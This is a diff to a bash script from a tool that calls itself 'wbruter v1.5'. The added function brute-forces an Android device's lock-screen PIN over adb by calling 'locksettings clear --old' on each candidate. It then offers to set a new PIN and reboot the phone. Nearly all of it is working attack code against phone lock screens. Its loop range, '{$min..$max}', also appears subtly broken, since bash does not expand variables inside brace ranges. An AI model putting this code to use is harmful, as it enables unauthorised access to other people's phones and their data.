@@ -135,6 +135,42 @@ exit 1
     fi
 }
 
+customandroid() {
+    read -p "Min: " min
+    read -p "Max: " max
+    cr=`echo $'\n.'`
+    cr=${cr%.}
+    printf "%52s\n" | tr ' ' '-'
+    echo -e "Bruteforce attack will be started within 2 seconds..\nPlease use (CTRL+C) to abort the attack at anytime.."
+    printf "%52s\n" | tr ' ' '-'
+    for i in {$min..$max}; do
+        if [[ -z $(adb shell locksettings clear --old $i | grep "Lock credential cleared") ]]; then
+            printf "Wrong PIN: \e[1;31m$i\e[0m\n"
+        else
+            printf "\nPIN Code Has Been Found: \e[1;32m$i\e[0m\n\n"
+            printf "Do you want to set a new PIN "; read -p "(y/N): " newpin
+            case $newpin in
+                y)
+                    read -p "Pin: " newpin2
+                    adb shell locksettings set-pin $newpin2
+                    printf "\nIt is required to restart your device after\n"
+                    printf "PIN code has been set after old pin was erased..\n\n"
+                    ;;
+                N)
+                    printf "\nIt is required to restart your device after\n"
+                    printf "PIN code has been erased from your device..\n\n";
+                    ;;
+            esac
+            read -p "restart device (y/N): " rebootornot
+            case $rebootornot in
+                y) adb shell reboot; printf "\nRebooting device, use pin '$newpin2' for unlock device..\n\n" ;;
+                N) printf "\nPin was cracked by wbruter v1.5\n\n";exit 0 ;;
+            esac
+            exit
+        fi
+    done
+}
+
 android4() {
     cr=`echo $'\n.'`
     cr=${cr%.}
